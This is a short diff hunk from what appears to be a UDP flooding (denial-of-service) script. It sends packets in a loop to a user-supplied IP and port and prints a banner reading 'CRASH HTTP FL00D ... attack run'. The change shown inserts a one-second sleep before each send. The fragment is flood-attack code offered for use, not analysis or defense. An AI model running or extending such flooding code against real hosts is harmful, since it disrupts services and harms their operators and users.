@@ -56,6 +56,7 @@ def run():
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 			addr = (str(ip),int(port))
 			for x in range(times):
+				time.sleep(1),
 				s.sendto(data,addr)
 			print(i +" \033[94mCRASH  \033[31mHTTP\033[4mFL00D  \033[31m" +str(ip)+ "\033[97m = \033[33mattack run\033[0m")
 		except:
